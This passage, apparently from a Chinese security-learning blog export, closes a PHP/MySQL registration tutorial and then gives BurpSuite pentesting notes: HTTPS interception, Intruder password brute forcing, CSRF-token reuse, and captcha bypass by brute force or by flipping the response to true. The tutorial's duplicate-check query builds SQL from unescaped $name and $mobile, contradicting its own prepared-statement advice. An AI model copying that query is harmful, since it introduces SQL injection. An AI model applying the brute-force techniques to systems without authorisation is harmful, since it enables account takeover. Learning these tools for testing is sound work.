function_">getElementById</span>(<span class="string">&#x27;registerForm&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;submit&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    e.<span class="title function_">preventDefault</span>();</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;register.php&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">FormData</span>(<span class="variable language_">this</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>())</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> <span class="title function_">alert</span>(data));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><hr><h4 id="三、关键问题与解决方案"><a href="#三、关键问题与解决方案" class="headerlink" title="三、关键问题与解决方案"></a>三、<strong>关键问题与解决方案</strong></h4><ol><li><p><strong>防止SQL注入</strong>：<br>• <strong>解决方案</strong>：使用预处理语句（Prepared Statements）。</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO user_center (name, password, mobile) VALUES (?, ?, ?)&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;sss&quot;</span>, <span class="variable">$name</span>, <span class="variable">$password</span>, <span class="variable">$mobile</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br></pre></td></tr></table></figure></li><li><p><strong>密码安全</strong>：<br>• <strong>解决方案</strong>：使用 <code>password_hash()</code> 加密存储，<code>password_verify()</code> 验证。</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 注册时加密</span></span><br><span class="line"><span class="variable">$hashed_password</span> = <span class="title function_ invoke__">password_hash</span>(<span class="variable">$password</span>, PASSWORD_DEFAULT);</span><br><span class="line"><span class="comment">// 登录时验证</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">password_verify</span>(<span class="variable">$input_password</span>, <span class="variable">$db_password</span>)) &#123; ... &#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>重复注册校验</strong>：<br>• <strong>逻辑修正</strong>：查询时检查用户名或手机号是否存在。</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM user_center WHERE name=&#x27;<span class="subst">$name</span>&#x27; OR mobile=&#x27;<span class="subst">$mobile</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure></li></ol><hr><h4 id="四、扩展与优化方向"><a href="#四、扩展与优化方向" class="headerlink" title="四、扩展与优化方向"></a>四、<strong>扩展与优化方向</strong></h4><ol><li><p><strong>前后端分离</strong>：<br>• 前端通过AJAX与后端API交互，后端返回JSON数据。<br>• 示例响应格式：</p>  <figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;success&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;注册成功&quot;</span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>功能增强</strong>：<br>• <strong>找回密码</strong>：通过邮箱或手机验证码重置密码。<br>• <strong>用户角色</strong>：区分普通用户与管理员权限。</p></li><li><p><strong>部署与性能</strong>：<br>• 使用缓存（如Redis）减轻数据库压力。<br>• 配置HTTPS保障数据传输安全。</p></li></ol><hr><h4 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、<strong>总结</strong></h4><p> <strong>核心流程</strong>：</p><pre><code>1. 用户填写表单 → 前端校验 → 提交到后端。2. 后端连接数据库 → 校验数据合法性 → 执行增删查改。3. 返回结果至前端，提示用户操作状态。</code></pre><p><strong>关键技术</strong>：</p><ul><li>PHP与MySQL交互（<code>mysqli</code>扩展）。</li><li>密码加密与验证。</li><li>前端数据校验与异步请求。</li></ul><p>通过本课程，您已掌握用户认证系统的核心实现，下一阶段可挑战电商、社交等复杂业务场景！</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BurtSuite的应用</title>
      <link href="/2025/02/19/BurtSuite%E7%9A%84%E5%BA%94%E7%94%A8/"/>
      <url>/2025/02/19/BurtSuite%E7%9A%84%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="BurpSuite渗透测试"><a href="#BurpSuite渗透测试" class="headerlink" title="BurpSuite渗透测试"></a>BurpSuite渗透测试</h1><h2 id="bp的Proxy模块"><a href="#bp的Proxy模块" class="headerlink" title="bp的Proxy模块"></a>bp的Proxy模块</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ul><li>拦截</li><li>突破IP限制，隐藏IP，加速访问</li></ul><h3 id="代理设置方法"><a href="#代理设置方法" class="headerlink" title="代理设置方法"></a>代理设置方法</h3><ul><li>操作系统级别代理，设置IP和端口</li><li>浏览器</li><li>插件Proxy Switch</li></ul><h3 id="详细板块"><a href="#详细板块" class="headerlink" title="详细板块"></a>详细板块</h3><ul><li><p>拦截Intercept</p><ul><li>Forward：放行，放回浏览器</li><li>Drop：显示错误</li><li>Message actions：扫描，发送包到板块，修改内容，复制URL，做规则处理，拦截响应</li><li>Open browser：打开bp内置浏览器</li></ul></li><li><p>History：历史处理</p></li><li><p>march and replace：对请求和响应做一些规则的替换</p></li><li><p>proxy setting：拦截规则，响应内容修改，TLS穿透（不经过bp）</p></li></ul><h3 id="bp拦截HTTPS"><a href="#bp拦截HTTPS" class="headerlink" title="bp拦截HTTPS"></a>bp拦截HTTPS</h3><h4 id="HTTPS原理"><a href="#HTTPS原理" class="headerlink" title="HTTPS原理"></a>HTTPS原理</h4><ul><li>（1）浏览器和服务器建立https链接，浏览器将加密规则发送给服务器。 </li><li>（2）服务器从中选出一组加密算法与HASH算法，并将自己的身份信息以证书（地址，公钥）的形式发回给浏览器。</li><li>（3）浏览器得到服务器证书之后，浏览器进行以下处理： <ul><li>验证证书的合法性（颁发证书的机构是否合法，证书中包含的服务器地址是否与正在访问的地址一致等），如果证书受信任，则浏览器栏里面会显示一个小锁头，否则会给出证书不受信的提示。 </li><li>如果证书受信任，或者是用户接受了不受信的证书，浏览器会生成一串随机数的密码，并用证书中提供的公钥加密。 </li><li>使用约定好的HASH算法计算握手消息，并使用生成的随机数对消息进行加密，最后将之前生成的所有信息发送给服务器。</li></ul></li><li>（4）服务器接收浏览器发来的数据之后要做以下的操作： a) 使用自己的私钥将信息解密取出密码，使用密码解密浏览器发来的握手消息，并验证HASH是否与浏览器发来的一致。 b) 使用密码加密一段握手消息，发送给浏览器。 </li><li>（5）浏览器解密并计算握手消息的HASH，如果与服务端发来的HASH一致，此时握手过程结束，之后所有的通信数据将由之前浏览器生成的随机密码并利用对称加密算法进行加密。</li></ul><p><strong>服务器和浏览器各进行一次加解密</strong></p><h4 id="bp拦截HTTPS原理"><a href="#bp拦截HTTPS原理" class="headerlink" title="bp拦截HTTPS原理"></a>bp拦截HTTPS原理</h4><p>bp当作中间人</p><ul><li><p>bp截取客户端发送给服务器的请求，然后伪装成客户端与服务器进行通信；</p></li><li><p>bp就获取了服务器的发送给客服端的公钥，然后在bp上生成公私钥，再把bp生成的公钥发送给客户端。</p></li><li><p>客户端发送的对称加密密钥，也是发送给bp的，客户端就与bp建立了https连接。而bp则代替了客户端与服务器建立了https连接。</p></li><li><p>完成这一流程之后，客户端发送给服务器的内容，在bp上解密得到明文，在bp上看到的内容就是明文。而向服务器发送请求的时候，bp会用服务器协商好的密钥进行加密然后传输内容。</p></li><li><p>同样服务器返回的内容也是，bp会先解密，然后得到明文，bp 会伪装成服务器，再用bp与客户端协商好的密钥进行加密然后传输内容。</p></li><li><p>通过这样的手段，便可以获取客户端和服务器之间通信的所有内容。 使用中间人攻击手段，必须要让客户端信任中间人的证书，如果客户端不信任，则这种攻击手段也无法发挥作用。</p></li></ul><p><strong>bp拦截https，进行4次加解密</strong></p><h2 id="bp的Target模块"><a href="#bp的Target模块" class="headerlink" title="bp的Target模块"></a>bp的Target模块</h2><h3 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h3><ul><li>把握网站整体情况</li><li>对一次工作的域进行分析</li><li>分析网站存在的的攻击面</li></ul><h3 id="设置作用域"><a href="#设置作用域" class="headerlink" title="设置作用域"></a>设置作用域</h3><ul><li><p>同一个域：协议，域名，端口，必须一致</p></li><li><p>Scope：添加作用域</p></li><li><p>使用场景：</p><ul><li>限定Sitemap和https记录</li><li>限定Spider抓取哪些作用域的内容</li><li>限定Scanner扫描内容</li><li><strong>不会影响拦截功能</strong></li></ul></li></ul><h3 id="Sitemap"><a href="#Sitemap" class="headerlink" title="Sitemap"></a>Sitemap</h3><ul><li><p>记录类型（关闭拦截）</p><ul><li>自动（爬行）：获取全面信息</li><li>手动（浏览器访问）：仅仅根据自己需要</li></ul></li><li><p>过滤器</p></li></ul><h3 id="结果操作"><a href="#结果操作" class="headerlink" title="结果操作"></a>结果操作</h3><p>扫描，发送包，再次发起请求，</p><p>交互功能：search，搜索comment，脚本，字段（告诉服务器当前请求是从哪个页面链接来的）</p><h2 id="bp的scan模块"><a href="#bp的scan模块" class="headerlink" title="bp的scan模块"></a>bp的scan模块</h2><h3 id="主动扫描（crawl-and-audit）"><a href="#主动扫描（crawl-and-audit）" class="headerlink" title="主动扫描（crawl and audit）"></a>主动扫描（crawl and audit）</h3><ul><li>方式：爬取所有链接，显示漏洞</li><li>针对漏洞：<ul><li>客户端：如XSS，HTTP头注入，操作重定向</li><li>服务端：如SQL注入，命令行注入，文件遍历</li></ul></li></ul><h3 id="被动扫描-live-audit"><a href="#被动扫描-live-audit" class="headerlink" title="被动扫描  (live audit)"></a>被动扫描  (live audit)</h3><ul><li>方式：只检测经过BP代理服务器的地址，不爬取</li></ul><p><img src="/2025/02/19/BurtSuite%E7%9A%84%E5%BA%94%E7%94%A8/image-20250208113932507-1739072494281-5.png" alt="image-20250208113932507"></p><h2 id="bp的repeater模块"><a href="#bp的repeater模块" class="headerlink" title="bp的repeater模块"></a>bp的repeater模块</h2><h3 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h3><ul><li>发起http请求，分析响应</li><li>重放请求</li></ul><h2 id="bp的intruder模块"><a href="#bp的intruder模块" class="headerlink" title="bp的intruder模块"></a>bp的intruder模块</h2><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>修改请求参数，分析响应内容，获得特征数据</p><h3 id="实现密码暴力破解"><a href="#实现密码暴力破解" class="headerlink" title="实现密码暴力破解"></a>实现密码暴力破解</h3><ul><li>设计攻击模式<ul><li>sniper：使用一组payload和一个字段</li><li>batter ram：同时在所有字段放置相同 payload</li><li>pitchfork：设置多组payload，按出现顺序分配给多个字段</li><li>Cluster bomb： 为每个位置分配一组 payload，对每组所有可能组合进行迭代</li></ul></li><li>设计攻击字段</li><li>设置payload</li><li>设置线程值</li></ul><h3 id="获取CSFR-token"><a href="#获取CSFR-token" class="headerlink" title="获取CSFR token"></a>获取CSFR token</h3><p>token一次使用就销毁，因此要<strong>利用上一次响应结果的内容，作为本次请求的参数</strong>。</p><p>使用pitchfork，两组payload，type：recursive grep、单线程</p><p><img src="/2025/02/19/BurtSuite%E7%9A%84%E5%BA%94%E7%94%A8/image-20250208173650096-1739072403970-2-1739072472938-2.png" alt="image-20250208173650096-1739072403970-2"></p><h3 id="爆破验证码"><a href="#爆破验证码" class="headerlink" title="爆破验证码"></a>爆破验证码</h3><ul><li>爆破</li><li>修改响应为true</li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
